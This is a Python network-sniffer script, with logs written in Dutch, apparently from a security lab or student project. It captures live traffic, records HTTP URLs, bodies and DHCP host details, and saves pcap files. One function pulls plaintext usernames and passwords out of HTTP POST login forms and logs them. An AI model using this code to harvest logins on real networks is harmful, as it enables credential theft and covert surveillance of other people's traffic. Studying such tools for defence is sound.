import asyncio
import time
import pyshark
from scapy.all import *
import re
import threading
import os
import logging

def get_uuid():
    with open("uuid.txt", "r") as file:
        return file.read().strip()

def get_log_dir():
    uuid = get_uuid()
    log_dir = os.path.join("data", uuid, "sniffer_scan_results")
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    return log_dir

log_dir = get_log_dir()
log_path = os.path.join(log_dir, "sniffer_scan_results.log")

logging.basicConfig(filename=log_path, level=logging.INFO, format='%(asctime)s - %(message)s', filemode='a')

def packet_details():
    asyncio.set_event_loop(asyncio.new_event_loop())
    for packet in filter_packet(interface, display_filter):
        logging.info(f"Timestamp: {packet.sniff_time}")
        logging.info(f"Source IP: {packet.ip.src}")
        logging.info(f"Destination IP: {packet.ip.dst}")
        logging.info(f"Protocol: {packet.transport_layer}")
        if 'IP' in packet:
            logging.info(f"Source MAC: {packet.eth.src}")
            logging.info(f"Destination MAC: {packet.eth.dst}")
        if hasattr(packet.http, 'request_method'):
            logging.info(f"HTTP Methode: {packet.http.request_method}")
        
        if hasattr(packet.http, 'host') and hasattr(packet.http, 'request_uri'):
            logging.info(f"Volledige URL: http://{packet.http.host}{packet.http.request_uri}")

        if hasattr(packet.http, 'file_data'):
            logging.info(hex_to_ascii(packet.http.file_data))
        logging.info("---------------------------------------------------")

def extract_http_post_data():
    asyncio.set_event_loop(asyncio.new_event_loop())
    for packet in filter_packet(interface, "http"):
        if hasattr(packet, 'http') and hasattr(packet.http, 'file_data'):
                if hasattr(packet.http, 'request_method') and packet.http.request_method == 'POST':
                    post_data = hex_to_ascii(packet.http.file_data)
                    match = re.search(r'txtUsername=([^&]*)&txtPassword=([^&]*)', post_data)
                    if match:
                        username = match.group(1)
                        password = match.group(2)
                        logging.info(f"!!! ----------- Gevonden wachtwoord: Username: {username}, Password: {password} ----------- !!!")

def capture_and_save_pcap():
    asyncio.set_event_loop(asyncio.new_event_loop())

    Actualfilename = os.path.join(log_dir, filename)
    packets = pyshark.LiveCapture(interface=interface, output_file=Actualfilename)
    
    logging.info(f"Capturing packets on interface {interface}...")

    if capture_duration:
        packets.sniff(timeout=capture_duration)
    else:
        packets.sniff()

    logging.info(f"Capture saved to {filename}")

def listen_dhcp():
    def print_packet(packet):
        if packet.haslayer(Ether) and packet.haslayer(DHCP):
            target_mac = packet.getlayer(Ether).src
            dhcp_options = packet[DHCP].options

            requested_ip, hostname, vendor_id = None, None, None

            for item in dhcp_options:
                try:
                    label, value = item
                except ValueError:
                    continue

                if label == 'requested_addr':
                    requested_ip = value
                elif label == 'hostname':
                    hostname = value.decode()
                elif label == 'vendor_class_id':
                    vendor_id = value.decode()

            if target_mac and requested_ip and hostname and vendor_id:
                time_now = time.strftime("[%Y-%m-%d - %H:%M:%S]")
                logging.info(f"{time_now} : {target_mac}  -  {hostname} / {vendor_id} requested {requested_ip}")

    sniff(prn=print_packet, filter='udp and (port 67 or port 68)', store=0)

def hex_to_ascii(hex_string):
    try:
        hex_string = re.sub(r'[^0-9a-fA-F]', '', hex_string)
        return bytes.fromhex(hex_string).decode("utf-8")
    except:
        logging.info("ERROR")

def filter_packet(interface, display_filter):
    packets = pyshark.LiveCapture(interface=interface, display_filter=display_filter) # filter alleen http
    for packet in packets:
        yield packet

def start_function_in_thread(function):
    def wrapper():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        function()

    thread = threading.Thread(target=wrapper)
    thread.start()
    return thread

